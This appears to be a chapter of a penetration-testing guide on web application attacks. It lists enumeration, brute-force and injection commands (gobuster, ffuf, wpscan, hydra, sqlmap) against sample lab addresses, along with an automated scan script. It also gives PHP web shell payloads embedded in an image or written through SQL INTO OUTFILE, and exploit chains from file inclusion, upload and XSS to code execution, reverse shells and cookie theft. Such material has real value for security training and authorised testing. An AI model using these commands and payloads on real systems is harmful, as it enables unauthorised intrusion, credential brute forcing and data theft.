# 03 - Web Application Attacks

## Philosophy

Web applications represent the largest attack surface in modern networks. Unlike network services that follow predictable protocols, web apps are custom-built, poorly tested, and often exposed directly to the internet. This phase transforms a list of URLs and technologies into a foothold. The key is systematic testing—fuzzing every parameter, inspecting every response, and understanding the application's logic, not just its version numbers.

## Attack Surface Overview

- **Entry points**: URLs, forms, API endpoints, file uploads
- **Technologies**: Frameworks (Django, Rails), CMS (WordPress, Joomla), languages (PHP, ASP.NET)
- **Authentication mechanisms**: Login pages, session tokens, OAuth
- **Input vectors**: GET/POST parameters, headers, cookies, file uploads
- **Business logic**: Workflows, user roles, payment processes

## Web Application Testing Workflow
┌─────────────────────────────────────────────────────────┐
│ Initial Recon │
│ (URLs, technologies, sitemap from Information Gathering)│
└──────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│ Directory & File Enumeration │
│ (Hidden endpoints, backup files, admin panels) │
└──────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│ Parameter Fuzzing │
│ (Discover hidden parameters, inject payloads) │
└──────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│ Vulnerability-Specific Testing │
│ ┌──────────┐ ┌─────────┐ ┌─────────┐ ┌──────────┐ │
│ │ SQLi │ │ XSS │ │ LFI │ │ SSRF │ │
│ └──────────┘ └─────────┘ └─────────┘ └──────────┘ │
└──────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│ Authentication Testing │
│ (Brute force, session handling, privilege escalation) │
└──────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────┐
│ Post-Exploitation │
│ (Shell, data exfiltration, pivoting) │
└──────────────────────────────────────────────────────────┘


## Command Arsenal

### Directory and File Enumeration

```bash
# Gobuster - Fast directory brute force
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,asp,aspx,txt,html,zip,backup

# Dirb - Classic with extensions
dirb http://192.168.1.10 /usr/share/wordlists/dirb/common.txt -X .php,.html,.txt

# FFUF - Fast web fuzzer (supports recursion)
ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e .php,.html -recursion -recursion-depth 2

# WFuzz - Parameter fuzzing
wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://192.168.1.10/page.php?FUZZ=1
CMS Specific
bash
# WordPress
wpscan --url http://192.168.1.10 --enumerate vp,vt,u --api-token YOUR_TOKEN
wpscan --url http://192.168.1.10 --passwords /usr/share/wordlists/rockyou.txt --username admin

# Joomla
joomscan -u http://192.168.1.10
droopescan scan joomla --url http://192.168.1.10

# Drupal
droopescan scan drupal --url http://192.168.1.10
Parameter Injection Testing
bash
# SQL Injection basic detection
sqlmap -u "http://192.168.1.10/page.php?id=1" --batch --level 2 --risk 2
sqlmap -u "http://192.168.1.10/login.php" --data="user=admin&pass=admin" --level 3 --risk 3

# XSS detection with XSStrike
xsstrike -u "http://192.168.1.10/page.php?q=test" --crawl

# LFI/RFI
ffuf -u "http://192.168.1.10/page.php?file=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
File Upload Testing
bash
# Upload functionality testing with burp (manual) or using scripts
# Check for extension bypass
# Generate malicious image with exiftool
exiftool -Comment='<?php system($_GET['cmd']); ?>' image.jpg
Authentication Attacks
bash
# Hydra brute force on login forms
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"

# Medusa
medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/login.php -F

# Burp Suite Intruder (manual)
Deep Enumeration Techniques
JavaScript Analysis
bash
# Extract endpoints from JavaScript
grep -rhoP '"[A-Za-z0-9_/.-]*"' js/ | sort -u | sed 's/"//g'
# Use LinkFinder
python3 LinkFinder.py -i http://192.168.1.10 -d
API Endpoint Discovery
bash
# Fuzz for common API paths
ffuf -u http://192.168.1.10/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/objects.txt
ffuf -u http://192.168.1.10/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints.txt
GraphQL Introspection
bash
# Query introspection
curl -X POST http://192.168.1.10/graphql -H "Content-Type: application/json" -d '{"query":"query { __schema { types { name fields { name } } } }"}'
Service-Specific Testing
WordPress
bash
# Enumerate users
wpscan --url http://192.168.1.10 --enumerate u

# Check for vulnerable plugins
wpscan --url http://192.168.1.10 --enumerate vp

# Bruteforce XMLRPC
wpscan --url http://192.168.1.10 --passwords rockyou.txt --usernames admin
Joomla
bash
# Version detection
joomscan -u http://192.168.1.10
# Known exploits
searchsploit joomla [version]
Custom Applications
bash
# Manual testing with Burp Suite (proxy)
# Use ZAP for automated scanning
zap-cli quick-scan -s xss,sqli http://192.168.1.10
Automation Techniques
Complete Web App Scan Script
bash
#!/bin/bash
# web_scan.sh - Automated web application assessment

TARGET=$1
OUTDIR="web_scan_$(echo $TARGET | tr '/' '_')"
mkdir -p $OUTDIR

echo "[*] Directory enumeration"
gobuster dir -u $TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,asp,aspx,txt,html,zip,bak -o $OUTDIR/gobuster.txt

echo "[*] Technology detection"
whatweb $TARGET -v > $OUTDIR/whatweb.txt

echo "[*] Vulnerability scanning with nuclei"
nuclei -u $TARGET -t ~/nuclei-templates/ -severity critical,high,medium -o $OUTDIR/nuclei.txt

echo "[*] SQL injection scan"
sqlmap -u $TARGET --batch --crawl=3 --level 2 --risk 2 --output-dir=$OUTDIR/sqlmap

echo "[*] XSS scan"
xsstrike -u $TARGET --crawl --log $OUTDIR/xsstrike.log

echo "[+] Scan complete. Results in $OUTDIR"
Parameter Discovery Pipeline
bash
# Discover parameters and test for vulnerabilities
waybackurls $TARGET | grep -E "\.php|\.asp|\.jsp" | sort -u > params.txt
ffuf -u FUZZ -w params.txt -mc 200 -o valid_params.json
cat valid_params.json | jq -r '.results[].input.FUZZ' > working_urls.txt
while read url; do
    sqlmap -u "$url" --batch --level 2
done < working_urls.txt
Attack Path Identification
Decision Matrix
Finding	Next Step
Admin panel discovered	Brute force or default creds
SQL injection	Extract data, OS shell via into outfile or xp_cmdshell
File upload	Upload web shell, reverse shell
LFI	Read sensitive files, maybe RFS
XSS	Steal cookies, CSRF tokens
Open S3 bucket	Dump contents, look for secrets
Common Exploit Chains
LFI → Log Poisoning → RCE

Find LFI in parameter like ?page=

Write PHP code into access log via User-Agent

Include log file via LFI to execute

SQLi → Web Shell

Union-based injection to write file

SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"

File Upload → Reverse Shell

Bypass extension filters (e.g., double extensions, MIME type)

Upload PHP reverse shell

Access uploaded file

Common Mistakes
Mistake 1: Ignoring robots.txt and sitemap.xml

bash
# Always check these first
curl http://192.168.1.10/robots.txt
curl http://192.168.1.10/sitemap.xml
Mistake 2: Not fuzzing parameters
Many vulnerabilities hide in parameters not obvious in initial enumeration. Fuzz every input.

Mistake 3: Over-reliance on automated scanners
Automated scanners miss logic flaws. Manual testing is essential.

Mistake 4: Not checking for default credentials
Always try admin:admin, root:root, etc.

Professional Tips
Tip 1: Use Burp Suite's Intruder for targeted attacks
Learn to use payload positions and grep extract for efficient brute forcing.

Tip 2: Custom wordlists
Create targeted wordlists based on application keywords, employee names, etc.

Tip 3: Look for developer comments
View source for HTML comments containing passwords, endpoints, or TODOs.

Tip 4: Test all HTTP methods
OPTIONS to see allowed methods; try PUT, DELETE, etc.

Tip 5: Check for IDOR (Insecure Direct Object References)
Manipulate IDs in URLs (/user/123) to access others' data.

Output Organization
text
03-Web-Application-Attacks/
├── README.md
├── targets/
│   ├── http-192.168.1.10/
│   │   ├── dir_enum.txt
│   │   ├── whatweb.txt
│   │   ├── nuclei.txt
│   │   ├── sqlmap/
│   │   ├── burp_state/
│   │   └── shells/
│   ├── http-192.168.1.11/
│   └── wordpress-sites/
│       ├── 192.168.1.12/
│       └── wpscan_output.txt
├── findings.csv
└── attack_paths.txt

